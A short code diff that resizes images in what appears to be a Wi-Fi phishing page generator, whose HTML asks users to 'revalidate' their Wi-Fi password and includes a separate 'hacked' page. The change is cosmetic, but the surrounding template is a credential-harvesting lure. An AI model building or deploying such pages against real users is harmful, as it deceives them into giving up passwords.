@@ -40,7 +40,7 @@ const presentHTML = (title) => `<!DOCTYPE html>
 <body>
   <div id="password-form">
   	<div>${title || ''}</div>
-      <img src="wifi-icon3.png" width="520vw">
+      <img src="wifi-icon3.png" width="180vw">
       
       <p>Wifi passowrd needs to be revalidate for security purposes.</p> 
 
@@ -78,7 +78,7 @@ const presentHackedHTML = (title) => `<!DOCTYPE html>
 <body>
   <div id="password-form">
   	<div>${title || ''}</div>
-      <img src="hacked2.gif" alt="" width="520vw">
+      <img src="hacked2.gif" alt="" width="180vw">
 
   </div>
 	
